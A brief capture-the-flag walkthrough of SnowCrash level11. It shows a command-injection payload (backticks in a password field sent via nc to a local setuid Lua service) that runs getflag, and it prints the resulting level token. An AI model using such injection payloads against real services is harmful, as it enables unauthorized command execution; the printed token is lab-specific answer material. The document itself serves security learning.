# level11

Using `ls`, we can discover a lua file.

```bash
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

Firstable, we can try `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0` and the value, `NotSoEasy` as flag but it dosen't work.

Let's run the lua script.

```bash
level11@SnowCrash:~$ ./level11.lua 
lua: ./level11.lua:3: address already in use
stack traceback:
    [C]: in function 'assert'
    ./level11.lua:3: in main chunk
    [C]: ?
```

Already launch, lets exploit. After playing around, we can use the following payload we previously seen.

```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag` > /tmp/flag
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Let's head to level12.

```bash
level11@SnowCrash:~$ su level12
Password: 
level12@SnowCrash:~$ 
```
